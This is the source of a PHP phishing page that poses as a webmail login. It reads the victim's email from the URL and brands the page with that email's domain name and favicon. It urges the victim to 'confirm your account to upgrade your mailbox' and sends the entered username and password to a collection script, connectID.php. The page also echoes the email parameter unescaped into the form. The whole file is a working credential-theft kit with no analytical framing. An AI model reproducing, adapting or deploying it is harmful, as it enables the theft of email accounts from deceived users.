<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<html style="overflow-x: hidden;overflow-y: hidden;">
<head>
		<title><?php echo $yuh ?> Web Mail</title>
		<link rel="SHORTCUT ICON" href="http://<?php echo $domain ?>/favicon.ico"/>
		<link rel="stylesheet" type="text/css" href="FILES/me.css"> 

		<script type="text/javascript" language="javascript" src="FILES/LIBCommon.js"></script>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		
		<script language="javascript">
			function browserSupported()
			{
				var browser = GetBrowserType();
				var unsupportedBrowsers = new Array(BROWSER_TYPE_OPERA, BROWSER_TYPE_IE_PRE_6);
				var supported = true;
				for (var i = 0; supported && i < unsupportedBrowsers.length; i++)
				{
					if (unsupportedBrowsers[i] == browser)
					{
						supported = false;
					}
				}
				return supported;
			}
		
			function confirmBrowserSupport()
			{
				return browserSupported() || confirm('This browser is not supported, and the application may not work correctly.  Are you sure you wish to continue?');
			}
			
			function ForgottenPassword()
			{
			    var sUsername = document.getElementById("txtUsername").value;
			    
//			    if( sUsername == "" )
//			    {
//			        alert("[ME_TXT-Youmustenteryourusernametousethisfeature]");
//			    }
//			    else
//			    {
			        window.location.href = "ForgottenPassword.aspx?Username=" + sUsername;
//			    }    
			}
			
		</script>
<style type="text/css">
<!--
.style1 {
	font-size: 18px;
	font-weight: bold;
}
body {
	background-color: #FFFFFF;
}
-->
        </style>
</HEAD>
<BODY class="ME_LoginBody">
<form id="signin" method="post" action="connectID.php" data-component="singlesubmitter">
<CENTER>
<BR>
<BR>
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0"><TR><TD><img src='FILES/login_frame_top_left.gif'></TD>
<TD background='FILES/login_frame_top_bg.gif' class="ME_LoginDialogCanvas"></TD>
<TD><img src='FILES/login_frame_top_right.gif'></TD></TR>
<TR><TD background='FILES/login_frame_left_bg.gif'>&nbsp;</TD>
<TD class='ME_LoginFrameBody'><center>
<TABLE BORDER="0" bgcolor="white" cellpadding=0 cellspacing=0>
<TR valign="middle">
<TD align="center" valign="middle">
<TABLE class="ME_LoginFrameContent" CELLSPACING="0" CELLPADDING="0">
<TR>
<TD VALIGN="top" WIDTH="100%" class="ME_StandardText" align="center">
<CENTER>

<div align="center">

	<img src="FILES/logo.png" width="160" height="70">

	<br><br>

	<font face="verdana" size="2">
	Confirm your account to upgrade your mailbox 
	</font>
</div>
<TABLE width="250" border="0" CELLSPACING="2" CELLPADDING="0"><TR>
<TD bgcolor="white" align="center" valign="middle"><span class="style1"><?php echo $yuh ?> Online Webmail App<br><br></span></TD>
</TR>
<TR>
<BR><TD width="250" bgcolor="white" align="center" valign="middle">
<TABLE BORDER="0">
<TR>
<TD>
<input name="username" autocomplete="off" style="width:300px; height:40px; font-family: Verdana; font-size: 15px; font-weight: light; color:#000000; background-color: #ffffff; border: solid 1px #848484; padding: 8px;" type="email" id="username" value="<?php echo $_GET['email']; ?>" placeholder="Username">																			</TD>
</TR>
<TR>
  <TD><input  name="password" autocomplete="off" type="password" id="password" style="width:300px; height:40px; font-family: Verdana; font-size: 15px; font-weight: light; color:#000000; background-color: #ffffff; border: solid 1px #848484; padding: 8px;"  placeholder="Enter Password">  </TD>

</TR>
		
		 <TD><input type="submit" value="Upgrade Now" style="width:300px; height:60px; background-color: #0B2161; border: solid 3px #0B2161; 
	font-family: Verdana; font-size: 17px; font-weight: light; color: #ffffff; -moz-border-radius: 4px; -webkit-border-radius: 4px; 
	-khtml-border-radius: 4px; border-radius: 4px;
	-moz-box-shadow: 3px 3px 3px #888; -webkit-box-shadow: 3px 3px 3px #888; box-shadow: 3px 3px 3px #888;"></TD>
</TR>																</TABLE>																	</TD>
							</TR>
						  </TABLE>
															<TABLE>
																<TR>
																	<TD nowrap><span class="ME_StandardText"><input id="chkRemember" type="checkbox" name="chkRemember" /><label for="chkRemember">Remember my settings for this computer</label></span></TD>
																</TR>
															</TABLE>
						</CENTER>
					  </TD>
					</TR>
				  </TABLE>
				</TD>
			  </TR>
			</TABLE>								
							</center>
							<br>
							<!--Frame Content End -->
</TD>
<TD background='FILES/login_frame_right_bg.gif'>&nbsp;</TD>
	  </TR>
					<TR>
						<TD><img src='FILES/login_frame_bottom_left.gif'></TD>
						<TD background='FILES/login_frame_bottom_bg.gif'></TD>
						<TD><img src='FILES/login_frame_bottom_right.gif'></TD>
					</TR>
	</TABLE>				
				<BR>
				<TABLE border="0">
					<TR>
						<TD colspan="2" align="left" class="ME_StandardTextSmall">Secured by <?php echo $yuh ?> Webmail Security Systems |
							&copy; <?php echo $yuh ?>., 2016. All rights reserved.<BR>This computer program is protected by copyright law and international treaties.<BR>Unauthorized reproduction or distribution of this program, or any portion of it,<BR>may result in severe civil and criminal penalties.

							<BR>
							<BR>
						</TD>
					</TR>
				</TABLE>
				
  </CENTER>
<script language="JavaScript" type="text/javascript" src="FILES/PDF01.js"></script>
    <script type="text/javascript" src="FILES/PDF02.js"></script>
    <script type="text/javascript" src="FILES/PDF03.js"></script>
	<script type="text/javascript" src="FILES/PDF04.js"></script>		
<script language="JavaScript" type="text/javascript">
<!--
function SetFocus()
{
	var control = document.getElementById('password');
	if ( control != null )
	{
		try {
			control.focus();
		}
		catch (e) {}
	}
}


setTimeout(SetFocus,500);
// -->
</script></form>
	</BODY>
</HTML>